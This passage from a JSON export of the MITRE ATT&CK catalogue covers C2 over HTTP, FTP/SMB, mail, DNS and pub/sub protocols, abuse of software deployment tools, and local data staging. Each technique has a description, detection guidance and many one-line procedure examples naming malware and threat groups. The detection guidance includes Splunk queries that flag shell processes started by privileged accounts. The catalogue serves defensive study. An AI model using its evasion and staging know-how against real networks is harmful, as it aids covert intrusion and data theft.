      "Sagerunexcommunicates via HTTPS, at times using a hard-coded User Agent ofMozilla/5.0 (compatible; MSIE 7.0; Win32).[351]",
      "Saint Bothas used HTTP for C2 communications.[352]",
      "Sakulauses HTTP for C2.[353]",
      "SampleCheck5000can use the Exchange Web Services API for C2 communication.[274]",
      "Samuraican use a .NET HTTPListener class to receive and handle HTTP POST requests.[269]",
      "Sandworm Team's BCS-server tool connects to the designated C2 server via HTTP.[354]",
      "Sea Turtleconnected over TCP using HTTP to establish command and control channels.[355]",
      "SeaDukeuses HTTP and HTTPS for C2.[76]",
      "Seasaltuses HTTP for C2 communications.[356]",
      "ServHelperuses HTTP for C2.[357]",
      "ShadowPadcommunicates over HTTP to retrieve a string that is decoded into a C2 server URL.[358]",
      "Shamoonhas used HTTP for C2.[359]",
      "Sharkhas the ability to use HTTP in C2 communications.[250][251]",
      "ShimRatcommunicated over HTTP and HTTPS with C2 servers.[360]",
      "ShimRatReportercommunicated over HTTP with preconfigured C2 servers.[360]",
      "ShrinkLockeruses HTTP POST requests to communicate victim information back to the threat actor.[361]",
      "Sibotcommunicated with its C2 server via HTTP GET requests.[164]",
      "SideTwisthas used HTTP GET and POST requests over port 443 for C2.[362]",
      "Sidewinderhas used HTTP in C2 communications.[363][364][365]",
      "SilverTerrieruses HTTP for C2 communications.[366]",
      "SLIGHTPULSEhas the ability to process HTTP GET requests as a normal web server and to insert logic that will read or write files or execute commands in response to HTTP POST requests.[303]",
      "Sliverhas the ability to support C2 communications over HTTP and HTTPS.[367][368][369][370][371]",
      "SLOTHFULMEDIAhas used HTTP and HTTPS for C2 communications.[372]",
      "Small Sievecan contact actor-controlled C2 servers by using the Telegram API over HTTPS.[256]",
      "Smoke Loaderuses HTTP for C2.[373]",
      "SMOKEDHAMhas communicated with its C2 servers via HTTPS and HTTP POST requests.[374]",
      "SnappyTCPconnects to the command and control server via a TCP socket using HTTP.[375]",
      "SNUGRIDEcommunicates with its C2 server over HTTP.[330]",
      "During theSolarWinds Compromise,APT29used HTTP for C2 and data exfiltration.[376]",
      "SoreFangcan use HTTP in C2 communications.[377][378]",
      "Sparkhas used HTTP POST requests to communicate with its C2 server to receive commands.[379]",
      "SpeakUpuses POST and GET requests over HTTP to communicate with its main C&C server.[380]",
      "Squirrelwafflehas used HTTP POST requests for C2 communications.[381]",
      "STARWHALEhas the ability to contact actor-controlled C2 servers via HTTP.[382][256]",
      "STEADYPULSEcan parse web requests made to a targeted server to determine the next stage of execution.[303]",
      "StealBitcan use HTTP to exfiltrate files to actor-controlled infrastructure.[383][384]",
      "Stealth Falconmalware communicates with its C2 server via HTTPS.[385]",
      "StrelaStealercommunicates externally via HTTP POST with encrypted content.[386][387][388]",
      "StrongPitycan use HTTP and HTTPS in C2 communications.[389][390]",
      "Stuxnetuses HTTP to communicate with a command and control server.[391]",
      "ASUGARDUMPvariant has used HTTP for C2.[392]",
      "SUNBURSTcommunicated via HTTP GET or HTTP POST requests to third party servers for C2.[393]",
      "SUPERNOVAhad to receive an HTTP GET request containing a specific set of parameters in order to execute.[394][395]",
      "SVCReadycan communicate with its C2 servers via HTTP.[396]",
      "Sys10uses HTTP for C2.[397]",
      "TA505has used HTTP to communicate with C2 nodes.[398]",
      "TA551has used HTTP for C2 communications.[399]",
      "Taidoorhas used HTTP GET and POST requests for C2.[400]",
      "TAMECAThas used HTTP for C2 communications.[30]",
      "TeamTNThas thecurlcommand to send credentials over HTTP and thecurlandwgetcommands to download new software.[401][402][403]TeamTNThas also used a custom user agent HTTP header in shell scripts.[404]",
      "ThiefQuestuploads files via unencrypted HTTP.[405][406]",
      "Threat Group-3390malware has used HTTP for C2.[407]",
      "TinyTurlacan use HTTPS in C2 communications.[408]",
      "Tomiriscan use HTTP to establish C2 communications.[409]",
      "Torismacan use HTTP and HTTPS for C2 communications.[410]",
      "TrailBlazerhas used HTTP requests for C2.[411]",
      "TRANSLATEXThas used HTTP to communicate with the C2 server.[412]",
      "TrickBotuses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files.[413][10]",
      "Trojan.Karaganycan communicate with C2 via HTTP POST requests.[414]",
      "Troll Stealeruses HTTP to communicate to command and control infrastructure.[415]",
      "Tropic Trooperhas used HTTP in communication with the C2.[416][417]",
      "TSCookiecan multiple protocols including HTTP and HTTPS in communication with command and control (C2) servers.[418][419]",
      "Turianhas the ability to use HTTP for its C2.[420]",
      "Turlahas used HTTP and HTTPS for C2 communications.[421][422]",
      "UBoatRAThas used HTTP for C2 communications.[423]",
      "UPPERCUThas used HTTP for C2, including sending error codes in Cookie headers.[424]",
      "Uroburoscan use a custom HTTP-based protocol for large data communications that can blend with normal network traffic by riding on top of standard HTTP.[425]",
      "Ursnifhas used HTTPS for C2.[426][427][428]",
      "Valakhas used HTTP in communications with C2.[429][399]",
      "VaporRagecan use HTTP to download shellcode from compromised websites.[54]",
      "Vasportcreates a backdoor by making a connection using a HTTP POST.[430]",
      "VBShowerhas attempted to obtain a VBS script from command and control (C2) nodes over HTTP.[431]",
      "VERMINuses HTTP for C2 communications.[432]",
      "Versa Director Zero Day Exploitationestablished HTTPS communications from adversary-controlled SOHO devices over port 443 with compromised Versa Director servers.[433]",
      "WellMesscan use HTTP and HTTPS in C2 communications.[434][435][436][378]",
      "WhisperGatecan make an HTTPS connection to download additional files.[437][438]",
      "Windshifthas used tools that communicate with C2 over HTTP.[439]",
      "WindTailhas the ability to use HTTP for C2 communications.[440]",
      "WinMMuses HTTP for C2.[397]",
      "Winnti for Linuxhas used HTTP in outbound communications.[441]",
      "Winnti for Windowshas the ability to use encapsulated HTTP/S in C2 communications.[442]",
      "Winter Vivernuses HTTP and HTTPS protocols for exfiltration and command and control activity.[443][444]",
      "WIREFIREcan respond to specific HTTPPOSTrequests to/api/v1/cav/client/visits.[445][446]",
      "WIRTEhas used HTTP for network communication.[447]",
      "Wizard Spiderhas used HTTP for network communications.[448]",
      "Woody RATcan communicate with its C2 server using HTTP requests.[449]",
      "Xbashuses HTTP for C2 communications.[450]",
      "xCaonhas communicated with the C2 server by sending POST requests over HTTP.[451]",
      "XLoaderuses HTTP and HTTPS for command and control communication.[452]",
      "YAHOYAHuses HTTP for C2.[453]",
      "Zebrocyuses HTTP for C2.[454][455][456][457][458][459]",
      "ZeroThas used HTTP for C2.[460][461]",
      "Zeus Pandauses HTTP for C2 communications.[462]",
      "ZLibcommunicates over HTTP for C2.[252]",
      "ZxShellhas used HTTP for C2 connections.[463]"
    ]
  },
  "T1071.002": {
    "Name": "Application Layer Protocol:File Transfer Protocols",
    "Description": "Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.Protocols such as SMB[1], FTP[2], FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor and analyze traffic flows that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
    ],
    "Procedure Examples": [
      "APT41used exploit payloads that initiate download viaftp.[3]",
      "Attorhas used FTP protocol for C2 communication.[4]",
      "BADHATCHcan emulate an FTP server to connect to actor-controlled C2 servers.[5]",
      "CARROTBALLhas the ability to use FTP in C2 communications.[6]",
      "Cobalt Strikecan conduct peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.[7][8]",
      "Discocan use SMB to transfer files.[9]",
      "Dragonflyhas used SMB for C2.[1]",
      "JPINcan communicate over FTP.[10]",
      "Kazuaruses FTP and FTPS to communicate with the C2 server.[11]",
      "Kimsukyhas used FTP to download additional malware to the target machine.[12]",
      "Macheteuses FTP for Command & Control.[2][13][14]",
      "Mythicsupports SMB-based peer-to-peer C2 profiles.[15]",
      "NOKKIhas used FTP for C2 communications.[16]",
      "DuringOperation Honeybee, the threat actors had the ability to use FTP for C2.[17]",
      "PoetRAThas used FTP for C2 communications.[18]",
      "TheReginmalware platform supports many standard protocols, including SMB.[19]",
      "ShadowPadhas used FTP for C2 communications.[20]",
      "SharpDiscohas the ability to transfer data between SMB shares.[9]",
      "SilverTerrieruses FTP for C2 communications.[21]",
      "SYSCONhas the ability to use FTP in C2 communications.[22][6]",
      "XAgentOSXcontains the ftpUpload function to use the FTPManager:uploadFile method to upload files from the target system.[23]",
      "ZxShellhas used FTP for C2 connections.[24]"
    ]
  },
  "T1071.003": {
    "Name": "Application Layer Protocol:Mail Protocols",
    "Description": "Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.[1]",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor and analyze traffic flows that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
    ],
    "Procedure Examples": [
      "Agent Teslahas used SMTP for C2 communications.[2][3][4]",
      "APT28has used IMAP, POP3, and SMTP for a communication channel in various implants, including using self-registered Google Mail accounts and later compromised email servers of its victims.[1][5]",
      "APT32has used email for C2 via an Office macro.[6][7]",
      "BadPatchuses SMTP for C2.[8]",
      "Cannonuses SMTP/S and POP3/S for C2 communications by sending and receiving emails.[9]",
      "Various implementations ofCHOPSTICKcommunicate with C2 over SMTP and POP3.[10]",
      "ComRATcan use email attachments for command and control.[11]",
      "CORESHELLcan communicate over SMTP and POP3 for C2.[1][12]",
      "Goopyhas the ability to use a Microsoft Outlook backdoor macro to communicate with its C2.[7]",
      "IMAPLoaderuses the IMAP email protocol for command and control purposes.[13]",
      "JPINcan send email over SMTP.[14]",
      "Kimsukyhas used e-mail to send exfiltrated data to C2 servers.[15]",
      "LightNeuronuses SMTP for C2.[16]",
      "LunarMailcan communicates with C2 using email messages via the Outlook Messaging API (MAPI).[17]",
      "NavRATuses the email platform, Naver, for C2 communications, leveraging SMTP.[18]",
      "NightClubcan use emails for C2 communications.[19]",
      "OLDBAITcan use SMTP for C2.[1]",
      "PowerExchangecan receive and send back the results of executed C2 commands through email.[20]",
      "RDATcan use email attachments for C2 communications.[21]",
      "Remsecis capable of using SMTP for C2.[22][23][24][25]",
      "SilverTerrieruses SMTP for C2 communications.[26]",
      "ASUGARDUMPvariant used SMTP for C2.[27]",
      "Turlahas used multiple backdoors which communicate with a C2 server via email attachments.[28]",
      "Uroburoscan use custom communications protocols that ride over SMTP.[29]",
      "Zebrocyuses SMTP and POP3 for C2.[30][9][31][32][33]"
    ]
  },
  "T1071.004": {
    "Name": "Application Layer Protocol:DNS",
    "Description": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.[1][2]",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for DNS over TLS (DoT) and DNS over HTTPS (DoH), that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor for DNS traffic to/from known-bad or suspicious domains and analyze traffic flows that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
    ],
    "Procedure Examples": [
      "Variants ofAnchorcan use DNS tunneling to communicate with C2.[3][4]",
      "APT18uses DNS for C2 communications.[5]",
      "APT39has used remote access tools that leverage DNS in communications with C2.[6]",
      "APT41used DNS for C2 communications.[7][8]",
      "BONDUPDATERcan use DNS and TXT records within its DNS tunneling protocol for command and control.[9]",
      "Brute Ratel C4can use DNS over HTTPS for C2.[10][11]",
      "Chimerahas usedCobalt Striketo encapsulate C2 in DNS traffic.[12]",
      "Cobalt Grouphas used DNS tunneling for C2.[13][14][15]",
      "Cobalt Strikecan use a custom command and control protocol that can be encapsulated in DNS. All protocols use their standard assigned ports.[16][17][18]",
      "Cobian RATuses DNS for C2.[19]",
      "DuringCutting Edge, threat actors used DNS to tunnel IPv4 C2 traffic.[20]",
      "DanBotcan use use IPv4 A records and IPv6 AAAA DNS records in C2 communications.[21]",
      "DarkGatecan cloak command and control traffic in DNS records from legitimate services to avoid reputation-based detection techniques.[22]",
      "Denishas used DNS tunneling for C2 communications.[23][24][25]",
      "DnsSystemcan direct queries to custom DNS servers and return C2 commands using TXT records.[26]",
      "Eburyhas used DNS requests over UDP port 53 for C2.[27]",
      "Ember Bearhas used DNS tunnelling tools, such as dnscat/2 and Iodine, for C2 purposes.[28]",
      "FIN7has performed C2 using DNS via A, OPT, and TXT records.[29]",
      "Gelsemiumhas the ability to use DNS in communication with C2.[30]",
      "Goopyhas the ability to communicate with its C2 over DNS.[25]",
      "Green Lambertcan use DNS for C2 communications.[31][32]",
      "Helminthcan use DNS for C2.[33]",
      "Heyoka Backdoorcan use DNS tunneling for C2 communications.[34]",
      "HTTPBrowserhas used DNS for command and control.[35][36]",
      "InvisiMolehas used a custom implementation of DNS tunneling to embed C2 communications in DNS requests and replies.[37]",
      "Ke3changmalware RoyalDNS has used DNS for C2.[38]",
      "Variants ofKevincan communicate over DNS through queries to the server for constructed domain names with embedded information.[39]",
      "LazyScripterhas leveraged dynamic DNS providers for C2 communications.[40]",
      "Matryoshkauses DNS for C2.[41][42]",
      "Milanhas the ability to use DNS for C2 communications.[43][39][44]",
      "Morican use DNS tunneling to communicate with C2.[45][46]",
      "Mythicsupports DNS-based C2 profiles.[47]",
      "NanHaiShuuses DNS for the C2 communications.[48]",
      "NightClubcan use a DNS tunneling plugin to exfiltrate data by adding it to the subdomain portion of a DNS request.[49]",
      "OilRighas used DNS for C2 including the publicly availablerequestbin.nettunneling service.[50][51][52][53]",
      "Pisloaderuses DNS as its C2 protocol.[54]",
      "PlugXcan be configured to use DNS for command and control.[35]",
      "POWERSOURCEuses DNS TXT records for C2.[55][56]",
      "POWRUNERcan use DNS for C2 communications.[57][51]",
      "QUADAGENTuses DNS for C2 communications.[58]",
      "RDAThas used DNS to communicate with the C2.[59]",
      "Remsecis capable of using DNS for C2.[60][61][62]",
      "ShadowPadhas used DNS tunneling for C2 communications.[63]",
      "Sharkcan use DNS in C2 communications.[43][44]",
      "Slivercan support C2 communications over DNS.[64][65][66][67][68]",
      "SombRATcan communicate over DNS with the C2 server.[69][70]",
      "SOUNDBITEcommunicates via DNS for C2.[71]",
      "SUNBURSTused DNS for C2 traffic designed to mimic normal SolarWinds API communications.[72]",
      "SysUpdatehas used DNS TXT requests as for its C2 communication.[73]",
      "TEXTMATEuses DNS TXT records for C2.[55]",
      "Tropic Trooper's backdoor has communicated to the C2 over the DNS protocol.[74]",
      "Uroburoshas encoded outbound C2 communications in DNS requests consisting of character strings made to resemble standard domain names. The actual information transmitted byUroburosis contained in the part of the character string prior to the first ‘.’ character.[75]",
      "WellMesshas the ability to use DNS tunneling for C2 communications.[76][77]"
    ]
  },
  "T1071.005": {
    "Name": "Application Layer Protocol:Publish/Subscribe Protocols",
    "Description": "Adversaries may communicate using publish/subscribe (pub/sub) application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.Protocols such asMQTT,XMPP,AMQP, andSTOMPuse a publish/subscribe design, with message distribution managed by a centralized broker.[1][2]Publishers categorize their messages by topics, while subscribers receive messages according to their subscribed topics.[1]An adversary may abuse publish/subscribe protocols to communicate with systems under their control from behind a message broker while also mimicking normal, expected traffic.",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor for traffic leveraging common publish/subscribe protocols to/from known-bad or suspicious domains and analyze traffic flows that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
    ],
    "Procedure Examples": [
      "GLOOXMAILcommunicates to servers operated by Google using the Jabber/XMPP protocol for C2.[2]"
    ]
  },
  "T1072": {
    "Name": "Software Deployment Tools",
    "Description": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.Access to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.SaaS-based configuration management services may allow for broadCloud Administration Commandon cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID.[1]Such services may also utilizeWeb Protocolsto communicate back to adversary owned infrastructure.[2]Network infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.[3]The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",
    "Detects": [
      "Often these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Ensure that third-party application logs are on-boarded to the enterprise logging system and the logs are regularly reviewed. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious. Monitor account login activity on these applications to detect suspicious/abnormal usage.Perform application deployment at regular times so that irregular deployment activity stands out.Analytic 1 - Look for irregular deployment activity, systems not typically used for deployment suddenly pushing software, abnormal account login activitysourcetype= aws_system_manager OR sourcetype=azure_arc | search (event_description=\"deployment\" OR action=\"push\" OR result=\"success\" OR result=\"failure\" OR command=\"run script\")Analytic 2 - Look for signs of malicious payloads or configurations being pushed using legitimate software deployment toolssourcetype=\"aws:cloudtrail\" OR sourcetype=\"windows:eventlog\" OR sourcetype=\"sccm:execmgr\"| search EventName=\"SendCommand\" OR EventName=\"StartSession\" OR \"SoftwareDeploymentEvent\"| stats count by UserIdentity.Arn, SourceIPAddress, EventTime, EventName, Command| eval suspicious=if(count > threshold_limit OR match(UserIdentity.Arn, \"unexpected_user_pattern\"), \"suspicious\", \"normal\")| where suspicious=\"suspicious\"| table EventTime, UserIdentity.Arn, SourceIPAddress, EventName, Command, suspicious",
      "Monitor for newly executed processes that does not correlate to known good software. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems.Note: This query detects the creation of suspicious processes initiated by system or administrative accounts (such as SYSTEM, Admin, or SCCM) that are not typical for those users, and filters the process creation based on unusual patterns. Processes like cmd.exe, powershell.exe, or python executed in this context without an expected parent process or correlation to authorized events should be flagged for investigation.Analytic 1 - Look for unusual software deployment processes, unexpected binaries or scripts, non-standard execution treessourcetype=WinEventLog:Security OR sourcetype=linux_audit | search (process_name IN (\"cmd.exe\", \"powershell.exe\", \"sh\", \"bash\", \"python\", \"wscript\", \"msiexec.exe\", \"installer\") AND user IN (\"SYSTEM\", \"Admin\", \"SCCM\"))"
    ],
    "Procedure Examples": [
      "APT32compromised McAfee ePO to move laterally by distributing malware as a software deployment task.[4]",
      "DuringC0018, the threat actors used PDQ Deploy to moveAvosLockerand tools across the network.[5]",
      "Sandworm Teamhas used the commercially available tool RemoteExec for agentless remote code execution.[6]",
      "Silencehas used RAdmin, a remote software tool used to remotely control workstations and ATMs.[7]",
      "Threat Group-1314actors used a victim's endpoint management platform, Altiris, for lateral movement.[8]",
      "It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute theWipermalware.[9]"
    ]
  },
  "T1074": {
    "Name": "Data Staged",
    "Description": "Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such asArchive Collected Data. Interactive command shells may be used, and common functionality withincmdand bash may be used to copy data into a staging location.[1]In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary mayCreate Cloud Instanceand stage data in that instance.[2]Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.",
    "Detects": [
      "Monitor executed commands and arguments arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.",
      "Monitor processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib.",
      "Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.",
      "Consider monitoring accesses and modifications to local storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection."
    ],
    "Procedure Examples": [
      "INC Ransomhas staged data on compromised hosts prior to exfiltration.[3][4]",
      "Kevincan create directories to store logs and other collected data.[5]",
      "Kobaloscan write captured SSH connection credentials to a file under the/var/rundirectory with a.pidextension for exfiltration.[6]",
      "QUIETCANARYhas the ability to stage data prior to exfiltration.[7]",
      "Scattered Spiderstages data in a centralized database prior to exfiltration.[8]",
      "Sharkhas stored information in folders namedU1andU2prior to exfiltration.[9]",
      "Volt Typhoonhas staged collected data in password-protected archives.[10]",
      "Wizard Spiderhas collected and staged credentials and network enumeration information, using  the networkdll and psfinTrickBotmodules.[11]"
    ]
  },
  "T1074.001": {
    "Name": "Data Staged:Local Data Staging",
    "Description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such asArchive Collected Data. Interactive command shells may be used, and common functionality withincmdand bash may be used to copy data into a staging location.Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.[1]",
    "Detects": [
      "Monitor executed commands and arguments arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.",
      "Monitor processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib.",
      "Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.",
      "Consider monitoring accesses and modifications to local storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection."
    ],
    "Procedure Examples": [
      "ADVSTORESHELLstores output from command execution in a .dat file in the %TEMP% directory.[2]",
      "Agriushas used the folder,C:\\windows\\temp\\s\\, to stage data for exfiltration.[3]",
      "AppleSeedcan stage files in a central location prior to exfiltration.[4]",
      "APT28has stored captured credential information in a file named pi.log.[5]",
      "DuringAPT28 Nearest Neighbor Campaign,APT28staged captured credential information in theC:\\ProgramDatadirectory.[6]",
      "APT3has been known to stage files for exfiltration in a single location.[7]",
      "APT39has utilized tools to aggregate data prior to exfiltration.[8]",
      "APT41 DUSTinvolved exporting data from Oracle databases to local CSV files prior to exfiltration.[9]",
      "APT5has staged data on compromised systems prior to exfiltration often inC:\\Users\\Public.[10]",
      "Astarothcollects data in a plaintext file named r1.log before exfiltration.[11]",
      "Attorhas staged collected data in a central upload directory prior to exfiltration.[12]",
      "AuTo Stealercan store collected data from an infected host to a file namedHostname_UserName.txtprior to exfiltration.[13]",
      "BackdoorDiplomacyhas copied files of interest to the main drive's recycle bin.[14]",
      "BADNEWScopies documents under 15MB found on the victim system to is the user's%temp%\\SMB\\folder. It also copies files from USB devices to a predefined directory.[15][16]",
      "BadPatchstores collected data in log files before exfiltration.[17]",
      "BoxCaonhas created a working folder for collected files that it sends to the C2 server.[18]",
      "DuringC0015, PowerView's file share enumeration results were stored in the filec:\\ProgramData\\found_shares.txt.[19]",
      "DuringC0017,APT41copied the localSAMandSYSTEMRegistry hives to a staging directory.[20]",
      "During theC0032campaign,TEMP.Velesused staging folders that are infrequently used by legitimate users or processes to store data for exfiltration and tool deployment.[21]",
      "Calistouses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.[22][23]",
      "Carboncreates a base directory that contains the files and folders that are collected.[24]",
      "Catchamasstores the gathered data from the machine in .db files and .bmp files under four separate locations.[25]",
      "ccf32can temporarily store files in a hidden directory on the local host.[26]",
      "Chimerahas staged stolen data locally on compromised hosts.[27]",
      "CHIMNEYSWEEPcan store captured screenshots to disk including to a covert store namedAPPX.%x%x%x%x%x.tmpwhere%xis a random value.[28]",
      "Chrommmecan store captured system information locally prior to exfiltration.[29]",
      "Crutchhas staged stolen files in theC:\\AMD\\Tempdirectory.[30]",
      "Cuckoo Stealerhas staged collected application data from Safari, Notes, and Keychain to/var/folder.[31]",
      "DarkWatchmancan stage local data in the Windows Registry.[1]",
      "Dragonflyhas created a directory named \"out\" in the user's %AppData% folder and copied files to it.[32]",
      "Dtrackcan save collected data to disk, different file formats, and network shares.[33][34]",
      "Modules can be pushed to and executed byDuquthat copy data to a staging area, compress it, and XOR encrypt it.[35]",
      "DustySkycreated folders in temp directories to host collected files before exfiltration.[36]",
      "Dyrehas the ability to create files in a TEMP folder to act as a database to store information.[37]",
      "ECCENTRICBANDWAGONhas stored keystrokes and screenshots within the%temp%\\GoogleChrome,%temp%\\Downloads, and%temp%\\TrendMicroUpdatedirectories.[38]",
      "Elisecreates a file inAppData\\Local\\Microsoft\\Windows\\Explorerand stores all harvested data in that file.[39]",
      "Exaramel for Windowsspecifies a path to store files scheduled for exfiltration.[40]",
      "FIN13has utilized the following temporary folders on compromised Windows and Linux systems for their operations prior to exfiltration:C:\\Windows\\Tempand/tmp.[41][42]",
      "FIN5scripts save memory dump data into a specific directory on hosts in the victim environment.[43]",
      "FLASHFLOODstages data it copies from the local system or removable drives in the \"%WINDIR%\\$NtUninstallKB885884$\\\" directory.[44]",
      "FrameworkPOScan identifiy payment card track data on the victim and copy it to a local file in a subdirectory of C:\\Windows.[45]",
      "FunnyDreamcan stage collected information including screen captures and logged keystrokes locally.[26]",
      "GALLIUMcompressed and staged files in multi-part archives in the Recycle Bin prior to exfiltration.[46]",
      "Gold Dragonstores information gathered from the endpoint in a file named 1.hwp.[47]",
      "Helminthcreates folders to store output from batch scripts prior to sending the information to its C2 server.[48]",
      "Indrik Spiderhas stored collected data in a .tmp file.[49]",
      "InvisiMoledetermines a working directory where it stores all the gathered data about the compromised machine.[50][51]",
      "DuringJuicy Mix,OilRigused browser data and credential stealer tools to stage stolen files named Cupdate, Eupdate, and IUpdate in the %TEMP% directory.[52]",
      "Kazuarstages command output and collected data in files before exfiltration.[53]",
      "KGH_SPYcan save collected system information to a file named \"info\" before exfiltration.[54]",
      "Kimsukyhas staged collected data files underC:\\Program Files\\Common Files\\System\\Ole DB\\.[55][56]",
      "KOPILUWAKhas piped the results from executed C2 commands to%TEMP%\\result2.daton the local machine.[57]",
      "Lazarus Groupmalware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server.[58][59]",
      "Leviathanhas used C:\\Windows\\Debug and C:\\Perflogs as staging directories.[60][61]",
      "Leviathanstored captured credential material on local log files on victim systems duringLeviathan Australian Intrusions.[62]",
      "LightNeuroncan store email data in files and directories specified in its configuration, such asC:\\Windows\\ServiceProfiles\\NetworkService\\appdata\\Local\\Temp\\.[63]",
